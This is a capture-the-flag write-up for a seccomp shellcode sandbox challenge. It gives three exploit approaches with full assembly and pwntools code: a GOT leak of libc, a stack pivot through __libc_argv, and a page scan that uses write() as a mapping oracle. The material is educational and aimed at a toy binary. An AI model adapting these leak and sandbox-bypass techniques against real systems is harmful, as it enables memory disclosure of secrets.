## Behavior

[The source code is available](./challenge.c).

This program is meant to execute a user's shellcode in a sandbox.
The target objective is to read the flag, which is stored in memory as well.

Specifically, the flag is stored in an `mmap` whose address is derived from 4 random bytes read from `/dev/urandom`; these bytes are read in a separate `mmap` with a random-address created solely for this purpose.

The sandbox consists of reading the user's shellcode in a random-address and executable `mmap`, replacing the stack with an empty and fixed-address `mmap` (with the `MAP_GROWSDOWN` flag to simulate the stack's behavior), setting up a seccomp which only allows read, write, and exit syscalls, and clearing "all" registers before jumping to the user's shellcode.

Disclaimer: all of my solutions are unintended.

## Solution 1

The flag is stored in an `mmap()`, but the only reference to it is on the stack, so i set leaking the stack as my objective.

Since the binary isn't PIE, i started looking into the `.bss` section of the binary, which is read-write, and i checked if there was something interesting in there.

I accidentally found the GOT in there, that i had forgotten about, and then i wrote some shellcode and a script to leak and pretty print it, and i got this:

```
[  0]:        0x7f03c9d06dc0    __libc_start_main
[  1]:                   0x0    __gmon_start__
[  2]:              0x403e10    UNKNOWN
[  3]:        0x7f03c9f642e0    UNKNOWN
[  4]:        0x7f03c9f3ec60    UNKNOWN
[  5]:        0x7f03c9f123d0    seccomp_init
[  6]:        0x7f03c9f137f0    seccomp_rule_add
[  7]:        0x7f03c9f12c40    seccomp_load
[  8]:        0x7f03c9dfbbc0    mmap
[  9]:        0x7f03c9d65060    setbuf
[ 10]:              0x401080    errx
[ 11]:        0x7f03c9d3d770    printf
[ 12]:        0x7f03c9df2100    close
[ 13]:        0x7f03c9df1980    read
[ 14]:        0x7f03c9df1690    open
```

I put this into [libc database](https://libc.rip), and found the libc version. I also could've leaked it from the Dockerfile, i guess.

Now, i remembered about [an article i read](https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/) about how to pivot from and to various parts of an ELF's memory, specifically that libc contains 2 useful symbols which point to the stack: `__libc_argv` and `envion`; for this solution, i'm using `__libc_argv`, but it shouldn't matter.

This symbol points to the current working directory string, which is near the base of the stack.

My idea was to leak the libc base from the GOT, then pivot to the stack via this symbol, and then climb the stack until i got to `main()`'s frame, and then move onto the pointer to the flag, and print it.
I implemented this in assembly by hand, which was really fun.

Here's the step by step reasoning of my shellcode. If a string like `{something}` is in the assembly, it's because i used python and pwntools to "hydrate" the assembly with the data i needed.

First, i read a GOT entry which points to a libc function, and subtract its offset to get the base of the library:

```assembly
mov rax, {exe.got['printf']};
mov rax, [rax];
sub rax, {libc.sym['printf']};
```

Then, i move onto `__libc_argv`, and pivot to the stack. This symbol is a pointer to a pointer to a string, so it has to be dereferenced twice; i also have to align myself on the stack.

```assembly
add rax, {libc.sym['__libc_argv']};
mov rax, [rax];
mov rax, [rax];
xor al, al;
```

Then, i climb the stack until i find a cell containing the address of the `main()` function:

```assembly
loop_body:
	mov rdx, [rax];

	/* equivalent to:
	if ($rdx == {exe.sym['main']}) {
		goto loop_exit;
	} else {
		goto loop_body;
	}
	*/

	cmp rdx, {exe.sym['main']};
	je loop_exit;
	sub rax, 8;
	jmp loop_body;

loop_exit:
```

Then, i move onto the flag pointer via a constant offset that i got from gdb:

```assembly
sub rax, 96;
```

And then i print it via a write syscall:

```assembly
mov rsi, [rax]; // it's a pointer to the flag actually
mov rax, 1;
mov rdi, 1;
mov rdx, 50;
syscall;
```

Finally, i exit with code 69 :)

```assembly
mov rax, 60;
mov rdi, 69;
syscall;
```

Here's the exploit in Python (without pwninit's boilerplate):

```python
io = conn()

payload = asm(f"""
// put libc's base into rax
mov rax, {exe.got['printf']};
mov rax, [rax];
sub rax, {libc.sym['printf']};

// pivot from libc to the stack via __libc_argv, put that stack addr into rax
add rax, {libc.sym['__libc_argv']};
mov rax, [rax];
mov rax, [rax];

// align rax to the stack
xor al, al; // al is the lower 4 bits of rax

// print the pwd
/*
	mov rsi, rax;
	mov rax, 1;
	mov rdi, 1;
	mov rdx, 40;
	syscall;
*/

// climb the stack until you find main's frame pointer
loop_body:
	mov rdx, [rax];
	cmp rdx, {exe.sym['main']};
	je loop_exit;
	sub rax, 8;
	jmp loop_body;

loop_exit:

// move onto the flag, via a constant offset
sub rax, 96;

// print it
mov rsi, [rax]; // it's a pointer to the flag actually
mov rax, 1;
mov rdi, 1;
mov rdx, 50;
syscall;

// exit with code 69
mov rax, 60;
mov rdi, 69;
syscall;
""")

io.send(payload)
io.interactive()
```

## Solution 2

Well, we don't actually need to pivot to the stack.

`mmap()` is deterministic. If your program creates a memory map without specifying its address, if you run it twice in the same environment, the address it will be assigned will have the same offset relative to `libc`'s base both times.

Knowing this, i checked the offset from gdb, and wrote this shellcode, which after leaking `libc`'s base, moves onto the memory map with the 4 random bytes, and re-calculates the flag's address in the same way the program does.

```assembly
// put libc's base into rax
mov rax, {exe.got['printf']};
mov rax, [rax];
sub rax, {libc.sym['printf']};

// pivot from libc to the mmap containing the random bytes from /dev/urandom
add rax, {udev_mmap_offset};

// calculate the flag's address
mov rax, [rax];
and eax, 0xfffff000;
add rax, 0x1337000;

// print it
mov rsi, rax;
mov rax, 1;
mov rdi, 1;
mov rdx, 50;
syscall;

// exit with code 69
mov rax, 60;
mov rdi, 69;
syscall;
```

The offset i found locally was 0x297000, and sure enough this exploit does work on my computer. But the offset is different on remote. I could leak it via my previous exploit but that feels like cheating. I tried getting gdb working on the docker container but encountered various issues. This should be doable, i just have a skill issue.

## Solution 3

The offset of that `/dev/urandom` `mmap` is relatively small. `mmap`s are page-aligned (page size is 0x1000), and 0x297000 / 0x1000 = 663.

On my computer the offset is the 663rd possible offset, which is kind of small.

So i wrote some shellcode to scan the first 1000 pages of the libc, checks if they're mapped, and if so it uses them as if they were the `/dev/urandom` map, and tries printing the flag.

I need to check if they're mapped because if i didn't my code would SEGFAULT.
The way i do this is by using a write syscall as an oracle.
If you try to write an unmapped buffer, the return value is a negative number, where normally it would be the number of bytes written.

Here's an example:

```assembly
mov rax, 1;
mov rsi, {sketchy_address};
mov rdi, 1;
mov rdx, 1;
syscall;

cmp rax;
jle unmapped_address_branch;

unmaped_address_branch:
// :(
mapped_address_branch:
// :)
```

Putting it all together, here's my final shellcode:

```assembly
// leak libc base
mov rax, {exe.got['printf']};
mov rax, [rax];
sub rax, {libc.sym['printf']};

mov r9, rax; // page being scanned
mov rcx, 1000; // stop counter
page_scanner_loop:
	mov r8, rcx; // rcx is overwritten by syscalls; preserve it

	// try to print this page to see if it's mapped
	mov rax, 1;
	mov rdi, 1;
	mov rsi, r9;
	mov rdx, 1;
	syscall;

	cmp rax, 0;
	jle unmapped_page_branch;

	// this is the mapped_page_branch
	
	// calculate the theoretical flag address
	mov rsi, [r9];
	and esi, 0xfffff000;
	add rsi, 0x1337000;

	// print it
	mov rax, 1;
	mov rdi, 1;
	mov rdx, 40;
	syscall;

	unmapped_page_branch: // early continue
	add r9, 4096; // move to next page
	mov rcx, r8; // fix rcx for the loop check

loop page_scanner_loop;

// graceful exit
mov rax, 60;
mov rdi, 69;
syscall;
```

I also added a snippet of code to the python exploit to filter out the huge output and only print the flag:

```python
io.send(payload)

delim_left = b"flag{" if args.LOCAL else b"amateursCTF{"

resp = io.recvall()
resp = resp.split(delim_left)[1].split(b"}")[0]
resp = delim_left + resp + b"}"

print(resp.decode())
io.interactive()
```
